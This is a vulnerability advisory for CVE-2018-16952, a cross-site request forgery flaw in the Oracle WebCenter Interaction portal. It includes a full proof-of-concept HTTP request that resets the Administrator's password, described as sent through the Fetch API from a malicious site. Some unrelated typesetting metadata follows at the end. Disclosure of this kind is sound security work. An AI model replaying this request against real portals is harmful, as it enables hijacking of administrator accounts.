# Oracle WebCenter Interaction - Portal Cross-Site Request Forgery

**CVE:** CVE-2018-16952

**CVSSv3:** 5.4 - CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

**Versions affected:** 10.3.3

## Introduction

Oracle WebCenter Interaction, formerly called BEA AquaLogic User Interaction and now part of Oracle WebCenter Suite, is an integrated, comprehensive collection of components used to create enterprise portals, collaborative communities, and composite and social applications.

## Background

The Oracle WebCenter Interaction (WCI) portal provides the primary user interface to the suite of products included in WCI. The portal can be deployed as an ASP.NET application for IIS when installed on Windows Server.

## Vulnerability

The Oracle WCI portal makes no attempt to prevent cross-site request forgery (CSRF) attacks. To prevent these attacks, all sensitive actions need to implement a form of anti-CSRF token or special header. These techniques prevent requests from other origins (such as malicious sites) from being surreptitiously submitted with the intention of executing sensitive actions in the context of authenticated portal users.

Consequently, the Oracle WCI portal is vulnerable to cross-site request forgery.

The following request, which reset's a user's password, demonstrates the complete absence of anti-CSRF techniques in the portal.

```
POST /portal/server.pt? HTTP/1.1
Host: <HOST>
Content-Length: 422
Cache-Control: max-age=0
Origin: http://<HOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: http://<HOST>/no-referrer
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: ptLastLoginAuthSource=; ptLTCN=ptLTCDV; ASP.NET_SessionId=gmevel55ijyce5yfgty5a045; plloginoccured=true
Connection: close

in_hi_PostToSelf=2&in_hi_Passthru=&in_hi_PassthruArgs=&in_hi_space=UserEditor&in_hi_spaceID=2&in_hi_control=UserRepost&in_hi_page=UsrMain&in_hi_EditorRedirectSpaceName=&in_hi_EditorRedirectPageName=&in_tx_CreateName=Administrator&in_pw_CreateLogin=Password1&in_pw_ConfirmLogin=Password1&in_hi_TreeSpaceID2=&in_hi_RowIndex2=&in_hi_MoveAction2=&in_hi_ColumnID2=&in_hi_RowIndex5=&in_hi_MoveAction5=&in_hi_ColumnID5=
```

The above request was submitted from a remote malicious website using the Fetch API with credentials included. When an authenticated user visits the malicious site, they inadvertently make the request to reset the Administrator's password. The user's session cookie is automatically included by the browser.

Although it may be possible for Oracle customers to implement a stop-gap solution, ultimately the resolution should have been implemented in the vanilla product.

This exploit could allow an attacker to gain unauthorised and privileged access to the portal once they mislead an authenticated user into visiting the malicious site.

## Versions Affected

This vulnerability affects version 10.3.3 of the Oracle WebCenter Interaction portal - specifically build 10.3.3.379633 (the latest version at the time of writing).

## References

N/A

## Credit

This vulnerability was discovered by Ben N (pajexali@gmail.com) 26 June, 2018.

---
mainfont: Roboto
monofont: Source Code Pro
header-includes:
    - \lstset{breaklines=true}
    - \lstset{language=[Motorola68k]Assembler}
    - \lstset{basicstyle=\small\ttfamily}
    - \lstset{extendedchars=true}
    - \lstset{tabsize=2}
    - \lstset{columns=fixed}
    - \lstset{showstringspaces=false}
    - \lstset{frame=trbl}
    - \lstset{frameround=tttt}
    - \lstset{framesep=4pt}
    - \lstset{numbers=left}
    - \lstset{numberstyle=\tiny\ttfamily}
    - \lstset{postbreak=\raisebox{0ex}[0ex][0ex]{\ensuremath{\color{red}\hookrightarrow\space}}}
...